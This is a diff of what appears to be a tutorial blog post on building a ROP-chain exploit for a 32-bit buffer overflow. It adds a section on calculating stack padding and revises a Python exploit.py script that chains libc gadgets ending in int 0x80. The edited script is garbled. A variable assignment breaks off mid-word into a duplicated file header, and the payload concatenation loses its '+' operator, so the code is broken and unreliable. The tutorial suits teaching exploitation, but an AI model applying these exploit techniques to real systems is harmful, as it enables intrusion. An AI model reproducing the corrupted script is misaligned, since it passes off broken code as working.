@@ -111,7 +111,7 @@ def main():
   global LIBC_ADDRESS
 
   if (len(sys.argv) != 3):
-    print("usage: ./exploit.py <buffer_address> <libc_address>")
+    print("usage: " + sys.argv[0] + " <buffer_address> <libc_address>")
     exit(-1)
 
   BUFFER_ADDRESS = int(sys.argv[1], 16)
@@ -173,6 +173,44 @@ def generate_rop():
   return rop
 ```
 
+
+#### Padding the Input
+
+Our script now generates the ropchain itself, but now we have to overflow the buffer to get control of `$eip`. To do this, we need to generate enough padding to overflow the original buffer along with any padding due to the fact that the function will begin with `$esp` on a 16-byte boundary. [In my post about shellcoding](https://j33m.net/2017/12/06/shellcode/), we found the amount of padding by looking at the disassembled preamble of the function to see how much stack space was allocated for the function. In this case, it is a little less straightforward.
+
+![disassembly of the getinput() function](res/getinput_disassembly.png)
+
+This time, the preamble of the function shows that `0x58` bytes are allocated on the stack at the instruction labeled '1'. This is a bit misleading because our buffer is not stored at `[esp+0x58]`. In the box labeled '2', we see that the second parameter (`[esp+0x04]`) to the `read()` function is actually `[ebp-0x48]`. This means that we need to overflow `0x48` bytes to get to the old `$ebp` value. 0x40 bytes come from the 64 bytes allocated for the input buffer, and 0x08 bytes of padding align `$esp`. 
+
+
+<i>The preamble allocates the extra 0x10 bytes for optimization. Instead of pushing and popping values from the stack for each function call in the program, we can just rewrite the parameters that we don't care about from the last function call.</i>
+
+![stack diagram](res/stack.png)
+
+We can now include some logic in our script to add padding to the beginning of our exploit:
+
+```python
+PRINT_STRING = 'SUCCESS!\n'
+
+# fill the buffer + padding + old ebp
+NOP_SIZE = BUFFER_SIZE - len(PRINT_STRING) + 8 + 4
+.
+.
+.
+
+def main():
+  .
+  .
+  .
+  # Add padding to chain
+  exploit = PRINT_STRING +\
+            '\x90' * NOP_SIZE
+            generate_rop()
+
+  print(exploit)
+
+```
+
 Now we can throw it all together and generate our full exploit!
 
 <strong>exploit.py</strong>
@@ -184,35 +222,42 @@ import struct
 
 BUFFER_SIZE = 64
 BUFFER_ADDRESS = None
+LIBC_ADDRESS = Non#!/usr/bin/python 
+
+import sys
+import struct
+
+BUFFER_SIZE = 64
+BUFFER_ADDRESS = None
 LIBC_ADDRESS = None
 
 PRINT_STRING = 'SUCCESS!\n'
 
-# overflow to BUFFER_SIZE + 8 due to stack alignment
-NOP_SIZE = BUFFER_SIZE - len(PRINT_STRING) + 8 
+# fill the buffer + padding + old ebp
+NOP_SIZE = BUFFER_SIZE - len(PRINT_STRING) + 8 + 4
 
 # Converts libc offset to address in memory
 def libc_addr(addr):
   return struct.pack('<I', addr + LIBC_ADDRESS)
 
 def set_edx(value):
-  # 0x00001aa6 : pop edx ; ret
+  # 0x00001aa6 : pop edx ; ret   
   return libc_addr(0x00001aa6) + struct.pack('<I', value)
 
 def set_ebx(value):
-  # 0x00018395 : pop ebx ; ret
+  # 0x00018395 : pop ebx ; ret     
   return libc_addr(0x00018395) + struct.pack('<I', value)
 
 def set_eax(value):
-  # 0x0002406e : pop eax ; ret
+  # 0x0002406e : pop eax ; ret  
   return libc_addr(0x0002406e) + struct.pack('<I', value)
 
 def set_ecx(value):
-  # 0x000b5377 : pop ecx ; ret
+  # 0x000b5377 : pop ecx ; ret 
   return libc_addr(0x000b5377) + struct.pack('<I', value)
 
 def syscall():
-  # 0x00002c87 : int 0x80
+  # 0x00002c87 : int 0x80       
   return libc_addr(0x00002c87)
 
 def generate_rop():
@@ -229,15 +274,14 @@ def main():
   global LIBC_ADDRESS
 
   if (len(sys.argv) != 3):
-    print("usage: ./exploit.py <buffer_address> <libc_address>")
+    print("usage: " + sys.argv[0] + " <buffer_address> <libc_address>")
     exit(-1)
 
   BUFFER_ADDRESS = int(sys.argv[1], 16)
   LIBC_ADDRESS = int(sys.argv[2], 16)
 
   exploit = PRINT_STRING +\
-            '\x90' * NOP_SIZE + \
-            '\x41'*4 + \
+            '\x90' * NOP_SIZE
             generate_rop()
 
   print(exploit)
